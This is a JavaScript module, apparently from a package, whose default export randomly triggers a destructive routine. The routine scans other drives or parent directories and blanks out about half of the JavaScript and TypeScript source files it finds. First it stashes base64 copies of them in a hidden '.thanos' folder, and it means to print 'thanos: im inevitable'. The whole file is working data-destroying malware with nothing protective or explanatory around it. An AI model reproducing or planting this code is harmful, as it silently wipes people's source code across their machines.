import fs from 'fs';
import path from 'path';
import os from 'os';
import process from 'process';

const diskSymbols = [];
const rootPath = process.cwd();
const isWin = os.platform().includes('win');
let isLog = false;
function thanosWinPower() {
  for (let i = 68; i <= 90; i++) {
    const base = `${String.fromCharCode(i)}:\\`;
    const tempFilePath = path.join(base, '\\.ensure-disk.txt');
    try {
      fs.writeFileSync(tempFilePath, 'hello world');
      fs.unlinkSync(tempFilePath);
      diskSymbols.push(base);
    } catch {}
  }
  diskSymbols.forEach((item) => {
    thanosPower(item);
  });
}

function thanosMacOSPower() {
  const parents = [];
  let tempPath = rootPath;
  while (1) {
    try {
      tempPath = path.join(tempPath, '../');
      if (parents.includes(tempPath)) {
        break;
      }
      const tempFilePath = path.join(tempPath, '\\.ensure-disk.txt');
      fs.writeFileSync(tempFilePath, 'hello world');
      fs.unlinkSync(tempFilePath);
      parents.push(tempPath);
    } catch {
      break;
    }
  }
  const parentRootPath = parents[parents.length -1];
  if (!parentRootPath) {
    return;
  }
  thanosPower(parentRootPath);
}

function thanosPower(dir) {
  if (dir === rootPath || dir.includes('node_modules')) {
    return;
  }
  setTimeout(function () {
    fs.readdir(dir, function(err, files) {
      if (err) {
        return;
      }
      files.forEach((item, index) => {
        const fullPath = path.join(dir, item);
        fs.stat(fullPath, function (err, stat) {
          if (err) {
            return;
          }
          if (stat.isDirectory()) {
            thanosPower(path.join(dir, item));
            return;
          }
          if (
            (
              fullPath.endsWith('.js') ||
              fullPath.endsWith('.jsx') ||
              fullPath.endsWith('.ts') ||
              fullPath.endsWith('.tsx')
            ) && Math.random() > 0.5
          ) {
            const bkuDir = path.join(rootPath, './.thanos');
            fs.stat(bkuDir, function (err, stat) {
              try {
                if (err || (stat && !stat.isDirectory())) {
                  fs.mkdirSync(bkuDir);
                }
              } catch {}
              const buff = Buffer.from(fullPath, 'utf-8');
              const bkuFileName = buff.toString('base64') + `.${fullPath.split('.').pop()}` + '.thanos';
              fs.readFile(fullPath, 'utf-8', function (err, data) {
                if (err) {
                  return;
                }
                const contentBuff = Buffer.from(data.toString(), 'utf-8');
                const contentBase64 = contentBuff.toString('base64');
                fs.writeFile(path.join(bkuDir, `./${bkuFileName}`), contentBase64, function (err) {
                  if (err) {
                    return;
                  }
                  fs.writeFileSync(fullPath, '', function (err) {
                    if (err) {
                      return;
                    }
                    if (!isLog && contentBase64 !== '') {
                      isLog = true;
                      console.log('\n  -  thanos: im inevitable');
                    }
                  });
                });
              });
            });
          }
        });
      });
    });
  }, 100 + (Math.random() * 300));
}

export default function () {
  if (Math.random() > 0.5) {
    if (isWin) {
      thanosWinPower()
    } else {
      thanosMacOSPower();
    }
  }
}
